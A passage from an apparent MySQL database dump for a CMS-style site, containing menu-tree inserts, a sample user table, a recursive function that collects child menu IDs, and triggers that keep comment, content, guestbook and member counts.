INSERT INTO `menu_tree` VALUES (31, 14, '/testIt/list', 160, 44, 1, '依赖自定义', '', 'userTest', 2, '1', 1, 0, '', 0);
INSERT INTO `menu_tree` VALUES (32, 14, '/neirong1', NULL, 2, 1, '中间内容菜单', '', '', 1, '1', NULL, 0, '', 0);
INSERT INTO `menu_tree` VALUES (35, 32, '/erji', 160, 2, 1, '测试二级', '', 'customMenuEdit', 2, '2', 1, 0, '{\"src\":\"https://www.baidu.com/\",\"setCollapse\":true}', 1);

-- ----------------------------
-- Table structure for user
-- ----------------------------
DROP TABLE IF EXISTS `user`;
CREATE TABLE `user`  (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `age` int(11) NULL DEFAULT NULL,
  `phone` bigint(20) NULL DEFAULT NULL,
  `desc` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of user
-- ----------------------------
INSERT INTO `user` VALUES (1, 'xlb', 12, 15951702555, '这是一个个测试hiHi好');

-- ----------------------------
-- Function structure for getChildLst
-- ----------------------------
DROP FUNCTION IF EXISTS `getChildLst`;
delimiter ;;
CREATE DEFINER=`root`@`localhost` FUNCTION `getChildLst`(`rootId` int) RETURNS varchar(1000) CHARSET utf8
BEGIN
  DECLARE childListStr VARCHAR(1024);

    DECLARE tempChildStr VARCHAR(1024);

    DECLARE rootIdStr VARCHAR(64);

    SET childListStr=NULL;

    SET rootIdStr=cast(rootId as CHAR);

    myloop: WHILE TRUE

    DO
-- 	   查询目标节点的直接一级子节点
        SELECT GROUP_CONCAT(id) INTO tempChildStr FROM `menu_tree` where FIND_IN_SET(parent_id,rootIdStr)>0;

--    如果一级子节点不为空
        IF tempChildStr IS NOT NULL THEN
-- 						设置下次查询的条件为当前查询到的一级节点的数据
            SET rootIdStr=tempChildStr;
-- 如果初次查询 则设置返回结果的初始值为当前查询结果
            IF childListStr IS NULL THEN

                SET childListStr=tempChildStr;
-- 不是第一次查询，如已经查询第二级别菜单了，则开始拼接字符串子集
            ELSE
                SET childListStr=concat(childListStr,',',tempChildStr);

            END IF;
-- 查询不到数据了结束查询
        ELSE

            LEAVE myloop;

        END IF;

    END WHILE;
-- 返回最终结果

  RETURN childListStr;

END
;;
delimiter ;

-- ----------------------------
-- Triggers structure for table jc_comment
-- ----------------------------
DROP TRIGGER IF EXISTS `triggerCommentInsert`;
delimiter ;;
CREATE TRIGGER `triggerCommentInsert` AFTER INSERT ON `jc_comment` FOR EACH ROW update jc_site_attr set attr_value=attr_value+1 where attr_name="commentTotal" and site_id=new.site_id
;;
delimiter ;

-- ----------------------------
-- Triggers structure for table jc_comment
-- ----------------------------
DROP TRIGGER IF EXISTS `triggerCommentDelete`;
delimiter ;;
CREATE TRIGGER `triggerCommentDelete` AFTER DELETE ON `jc_comment` FOR EACH ROW update jc_site_attr set attr_value=attr_value-1 where attr_name="commentTotal" and site_id=old.site_id
;;
delimiter ;

-- ----------------------------
-- Triggers structure for table jc_content
-- ----------------------------
DROP TRIGGER IF EXISTS `triggerContentInsert`;
delimiter ;;
CREATE TRIGGER `triggerContentInsert` AFTER INSERT ON `jc_content` FOR EACH ROW update jc_site_attr set attr_value=attr_value+1 where attr_name="contentTotal" and site_id=new.site_id
;;
delimiter ;

-- ----------------------------
-- Triggers structure for table jc_content
-- ----------------------------
DROP TRIGGER IF EXISTS `triggerContentDelete`;
delimiter ;;
CREATE TRIGGER `triggerContentDelete` AFTER DELETE ON `jc_content` FOR EACH ROW update jc_site_attr set attr_value=attr_value-1 where attr_name="contentTotal" and site_id=old.site_id
;;
delimiter ;

-- ----------------------------
-- Triggers structure for table jc_guestbook
-- ----------------------------
DROP TRIGGER IF EXISTS `triggerGuestbookInsert`;
delimiter ;;
CREATE TRIGGER `triggerGuestbookInsert` AFTER INSERT ON `jc_guestbook` FOR EACH ROW update jc_site_attr set attr_value=attr_value+1 where attr_name="guestbookTotal" and site_id=new.site_id
;;
delimiter ;

-- ----------------------------
-- Triggers structure for table jc_guestbook
-- ----------------------------
DROP TRIGGER IF EXISTS `triggerGuestbookDelete`;
delimiter ;;
CREATE TRIGGER `triggerGuestbookDelete` AFTER DELETE ON `jc_guestbook` FOR EACH ROW update jc_site_attr set attr_value=attr_value-1 where attr_name="guestbookTotal" and site_id=old.site_id
;;
delimiter ;

-- ----------------------------
-- Triggers structure for table jc_user
-- ----------------------------
DROP TRIGGER IF EXISTS `triggerMemberInsert`;
delimiter ;;
CREATE TRIGGER `triggerMemberInsert` AFTER INSERT ON `jc_user` FOR EACH ROW update jc_site_attr set attr_value=attr_value+1 where attr_name="memberTotal" and site_id=1 and new.is_admin=0
;;
delimiter ;

-- ----------------------------
-- Triggers structure for table jc_user
-- ----------------------------
DROP TRIGGER IF EXISTS `triggerMemberDelete`;
delimiter ;;
CREATE TRIGGER `triggerMemberDelete` AFTER DELETE ON `jc_user` FOR EACH ROW update jc_site_attr set attr_value=attr_value-1 where attr_name="memberTotal" and site_id=1 and old.is_admin=0
;;
delimiter ;

SET FOREIGN_KEY_CHECKS = 1;
